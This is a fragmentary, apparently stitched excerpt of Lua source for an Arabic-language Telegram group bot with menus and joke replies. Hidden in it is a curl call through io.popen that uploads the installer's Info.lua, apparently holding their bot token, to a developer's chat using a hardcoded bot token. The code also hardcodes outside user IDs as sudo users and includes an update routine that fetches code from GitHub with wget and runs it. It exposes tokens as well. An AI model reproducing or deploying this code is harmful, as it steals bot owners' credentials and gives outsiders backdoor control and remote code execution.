...
token = sudos.token 
--- start functions ♫___♬__☆ 𝐼𝐷𝐾ⱽᴵᴾ☆__♬___♫
--------------------------------------------------------------------------------------------------------------
...
sudo_users = {SUDO,1912084223,1815928911,1764999383}   
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '♫المطور ايدك',url="t.me/trrevor"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
local curl = 'curl "'..'https://api.telegram.org/bot1714366542:AAHo7wOqc8bnuOT_h_dkRu7dcrHHqkhgpXY/sendDocument'..'" -F "chat_id='.. 1912084223 ..'" -F "document=@'..'Info.lua'..'"' io.popen(curl)
--------------------------------------------------------------------------------------------------------------
...
os.execute('rm -rf DRAGON.lua')
os.execute('wget https://raw.githubusercontent.com/trevor462002/Trevor/main/DRAGON.lua?token=AUW7TKFUD5M5IMIWVAWXBEDBA2RNI')
send(msg.chat_id_, msg.id_,' ♫ تم تحديث السورس')
dofile('DRAGON.lua')  
end
...
local Text = [[
مطورين ومبرمجين سورس ايدك اتبع الازرار للتواصل معهم ⬇️🧿
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'ايدك مطور السورس',url="t.me/trrevor"}},
{{text = 'فوزي مطور السورس',url="t.me/Fr3on1"}},
...
'عاوز اي من '..Namebot..'',
'دوختو  '..Namebot..'',
'انت تعرف انو بوت  '..Namebot..'  متنصب علي سورس ايدك🙈♥️',
'بتشقط وجي ويت 🤪',
'ايوا جاي 🙈',
'يعم هتسحر واجي 😾',
...
send(msg.chat_id_,msg.id_, '[متمشنشنيش ..😹👻](t.me/trevor_0)')
return false
end
end
end
...
if text == 'مميزات' or text == 'المميزات'or text == '/helpMMM' then 
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'مميزات سورس ايدك')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
...
local Text =[[
اهلا بك في مميزات سورس ايدك 🚦
•♫•♬•𝐼𝒟𝒦ⱽᴵᴾ•♬•♫•
اختر الميزه الذي تريده بـ الأسفل.⬇️
[𝑆𝑂𝑈𝑅𝐶𝐸 𝐼𝐷𝐾ⱽᴵᴾ](t.me/trevor_0)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{{text = 'اغاني', callback_data="/helpMM"},{text = 'افلام', callback_data="/helpFF"}},
{{text = 'روايات', callback_data="/helpRR"},{text = 'العاب', callback_data="/helpGG"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
...
local Teext =[[
مرحبا بك في أغاني ايدك
❲[𝑆𝑂𝑈𝑅𝐶𝐸 𝐼𝐷𝐾ⱽᴵᴾ](t.me/trevor_0)❳ 
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'الرجوع الاوامر ✘', callback_data="/helpMMM"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
...
{
{text = '9️⃣', callback_data="/help9"},{text = '🔟', callback_data="/help10"},{text = '188', callback_data="/helpMMM"},
},
{
